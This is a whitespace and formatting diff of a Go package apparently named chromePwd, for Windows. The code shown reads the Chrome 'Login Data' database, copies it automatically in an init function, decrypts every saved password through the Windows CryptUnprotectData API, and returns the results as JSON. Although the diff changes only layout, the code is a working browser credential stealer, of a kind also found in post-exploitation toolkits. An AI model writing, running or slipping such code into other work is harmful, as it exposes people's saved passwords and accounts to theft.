@@ -1,4 +1,3 @@
-
 // +build windows
 
 package chromePwd
@@ -16,24 +15,22 @@ import (
 
 type Users struct {
 	UserId int
-	Uname string
-	Uage string
+	Uname  string
+	Uage   string
 }
-
 
 var (
 	dllcrypt32  = syscall.NewLazyDLL("Crypt32.dll")
 	dllkernel32 = syscall.NewLazyDLL("Kernel32.dll")
 
 	procDecryptData = dllcrypt32.NewProc("CryptUnprotectData")
-	procEncryData = dllcrypt32.NewProc("CryptProtectData")
+	procEncryData   = dllcrypt32.NewProc("CryptProtectData")
 	procLocalFree   = dllkernel32.NewProc("LocalFree")
 
 	dataPath string = os.Getenv("USERPROFILE") + "\\AppData\\Local\\Google\\Chrome\\User Data\\Default\\Login Data"
 )
 
-
-func init(){
+func init() {
 	data, err := ioutil.ReadFile(dataPath)
 	err = ioutil.WriteFile(dataPath+".bak", data, 0644)
 	if err != nil {
@@ -62,7 +59,6 @@ func (b *DATA_BLOB) ToByteArray() []byte {
 	return d
 }
 
-
 func checkErr(err error) {
 	if err != nil {
 		panic(err)
@@ -90,33 +86,33 @@ func Decrypt(data []byte) ([]byte, error) {
 }
 
 type PwdInfoNode struct {
-	origin_url	string	`json:"origin_url"`
-	action_url	string	`json:"action_url"`
-	username_element	string	`json:"username_element"`
-	username_value	string	`json:"username_value"`
-	password_element string	`json:"password_element"`
-	password_value	string	`json:"password_value"`
+	origin_url       string `json:"origin_url"`
+	action_url       string `json:"action_url"`
+	username_element string `json:"username_element"`
+	username_value   string `json:"username_value"`
+	password_element string `json:"password_element"`
+	password_value   string `json:"password_value"`
 }
 
-func GetChromePwd() (string,error) {
+func GetChromePwd() (string, error) {
 	var Pwdnode PwdInfoNode
 	var Pwdnodelist []PwdInfoNode
 	db, err := sql.Open("sqlite3", dataPath+".bak")
 	if err != nil {
-		return "",err
+		return "", err
 	}
 	fmt.Println(dataPath)
 	//"select EthName,Status,IFNULL(NetMod, \"\"),BrtName,Type from NETWORK_DEV"
-	rows, err := db.Query("select origin_url,action_url,username_element,username_value,password_element,password_value from logins");
+	rows, err := db.Query("select origin_url,action_url,username_element,username_value,password_element,password_value from logins")
 	if err != nil {
-		return "",err
+		return "", err
 	}
 	defer rows.Close()
 	for rows.Next() {
 		var password_value string
-		rows.Scan(&Pwdnode.origin_url,&Pwdnode.action_url,&Pwdnode.username_element,&Pwdnode.username_value,&Pwdnode.password_element,&password_value);
-		password_value_Decrypt,err := Decrypt([]byte(password_value))
-		if err==nil{
+		rows.Scan(&Pwdnode.origin_url, &Pwdnode.action_url, &Pwdnode.username_element, &Pwdnode.username_value, &Pwdnode.password_element, &password_value)
+		password_value_Decrypt, err := Decrypt([]byte(password_value))
+		if err == nil {
 			Pwdnode.password_value = string(password_value_Decrypt)
 		}
 		Pwdnodelist = append(Pwdnodelist, Pwdnode)
@@ -127,7 +123,7 @@ func GetChromePwd() (string,error) {
 		fmt.Println("JSON ERR:", err)
 	}
 
-	return string(b),nil
+	return string(b), nil
 }
 
 //func AddChromePwd(ChromePwdInfo ChromePwd) error {
